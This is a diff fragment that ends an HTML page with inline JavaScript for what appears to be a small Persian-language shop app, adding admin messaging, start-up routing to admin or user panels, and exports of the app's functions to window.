+            showToast(approve ? "تایید شد" : "رد شد"); 
+        } 
+    }
+    
+    function sendAdminMessage(){ 
+        let target = document.getElementById('msgUserSelect')?.value; 
+        let text = document.getElementById('adminMessageText')?.value; 
+        if(!text) return; 
+        if(target === 'all') users.forEach(u=>{ adminMessages.push({userId:u.email, message:text, date:new Date().toLocaleString()}); }); 
+        else adminMessages.push({userId:target, message:text, date:new Date().toLocaleString()}); 
+        saveAll(); 
+        showToast("پیام ارسال شد"); 
+        adminTab('sendMsg'); 
+    }
+    // ====================================
+    
+    function start(){ 
+        if(currentUser){ 
+            if(currentUser.isAdmin === true) showAdminPanel(); 
+            else showUserPanel(); 
+        } else { 
+            showLogin(); 
+        } 
+    }
+    
+    // اکسپوز توابع به window
+    window.addToCart = addToCart; window.removeFromCart = removeFromCart; window.updateQty = updateQty;
+    window.checkout = checkout; window.sendTicket = sendTicket; window.requestBalance = requestBalance;
+    window.userLogin = userLogin; window.userRegister = userRegister; window.showLogin = showLogin;
+    window.showUserRegister = showUserRegister; window.logout = logout; window.showUserTab = showUserTab;
+    window.togglePassword = togglePassword;
+    window.adminTab = adminTab; window.adminAddBalance = adminAddBalance; window.approveBalance = approveBalance;
+    window.sendAdminMessage = sendAdminMessage;
+    
+    start();
+</script>
+</body>
+</html>
